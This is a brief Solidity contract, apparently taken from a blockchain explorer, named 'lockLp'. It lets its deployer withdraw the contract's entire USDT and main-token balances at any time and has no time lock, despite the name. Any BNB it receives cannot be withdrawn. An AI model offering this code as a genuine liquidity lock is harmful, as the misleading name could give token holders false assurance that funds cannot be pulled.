/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
contract lockLp{
    IERC20 USDT= IERC20(address(0x55d398326f99059fF775485246999027B3197955));     
    IERC20 Maintokens;
    address admin;

    constructor(){
        Maintokens=IERC20(address(0x28603975cAC5C7cb6D4B81a8f3409dEeAD37b44A));
        admin=msg.sender;
    }

    receive() external payable {}

    function GetUsdt()public{
        require(msg.sender == admin, "!owner");
        USDT.transfer(admin,USDT.balanceOf(address(this)));
    }

    function GetMaintoken()public{
        require(msg.sender == admin, "!owner");
        Maintokens.transfer(admin,Maintokens.balanceOf(address(this)));
    }
}